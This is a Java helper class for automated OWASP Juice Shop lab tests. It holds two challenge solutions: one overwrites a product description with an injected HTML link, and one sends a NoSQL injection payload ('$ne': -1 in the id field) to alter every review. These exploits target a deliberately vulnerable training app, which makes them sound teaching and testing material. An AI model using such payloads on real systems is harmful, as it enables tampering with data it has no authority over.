package utilities.JuiceShop;

import org.openqa.selenium.json.Json;
import java.io.IOException;
import java.net.http.HttpResponse;
import java.util.Map;

/**
 * Groups product catalog and review operations used by the Juice Shop lab tests.
 */
public final class CatalogActions extends ActionContext {
    /**
     * Uses the shared per-test HTTP client and JSON JSON converter.
     *
     * @param api configured application client
     * @param json shared JSON JSON converter
     */
    CatalogActions(JuiceShopApi api, Json json) { super(api, json); }

    /**
     * Collects the catalog update observation used by the product-integrity challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> tamperWithProductDescription() throws IOException, InterruptedException {
        var session = api.login();
        return api.put("/api/Products/9", Map.of("description", "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"), session.token());
    }

    /**
     * Collects the review-integrity observation used by the related lab challenge.
     *
     * @return the HTTP response containing the status code, headers, and response body from the requested endpoint
     * @throws IOException if a required file or HTTP stream cannot be read or written
     * @throws InterruptedException if the current thread is interrupted while waiting for the operation
     */
    public HttpResponse<String> updateAllReviewsViaNoSql() throws IOException, InterruptedException {
        var session = api.login();
        String body = json.toJson(Map.of("id", Map.of("$ne", -1), "message", "NoSQL Injection!"));
        return api.sendApi("PATCH", "/rest/products/reviews", body, session.token());
    }
}
